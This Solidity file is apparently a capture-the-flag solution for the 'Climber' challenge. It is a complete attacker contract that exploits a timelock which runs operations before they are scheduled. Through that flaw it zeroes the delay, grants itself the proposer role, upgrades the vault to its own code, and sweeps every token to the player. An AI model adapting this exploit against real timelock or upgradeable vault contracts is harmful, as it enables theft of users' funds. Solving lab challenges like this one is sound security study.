// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY, WITHDRAWAL_LIMIT, WAITING_PERIOD} from "./ClimberConstants.sol";
import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract ClimberAttacker is OwnableUpgradeable, UUPSUpgradeable {
    ClimberTimelock climber; 
    ClimberVault vault;
    address token;
    address player;

    constructor(ClimberTimelock _climber, ClimberVault _vault, address _token, address _player) {
        climber = _climber;
        vault = _vault;
        token = _token;
        player = _player;
    }

    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}

    function _sweepFunds(address _token, address receiver) external {
        SafeTransferLib.safeTransfer(_token, receiver, IERC20(_token).balanceOf(address(this)));
    }

    function getData() private returns (address[] memory, uint256[] memory, bytes[] memory) {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        // update delay to 0
        targets[0] = address(climber);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // grant role
        targets[1] = address(climber);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));

        // upgrade
        targets[2] = address(vault);
        values[2] = 0;
        bytes memory callData = abi.encodeWithSignature("_sweepFunds(address,address)", token, player);
        dataElements[2] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(this), callData);

        // schedule
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("schedule(address[],uint256[],bytes[],bytes32)", 
            targets, 
            values, 
            dataElements,
            ""
        );

        return (targets, values, dataElements);
    }

    function attack() external {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements) = getData();
        climber.execute(
            targets,
            values,
            dataElements,
            ""
        );
    }

    function schedule(address[] calldata _targets, uint256[] calldata _values, bytes[] calldata _dataElements, bytes32 _salt) external {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements) = getData();
        climber.schedule(
            targets,
            values,
            dataElements,
            ""
        );
    }
}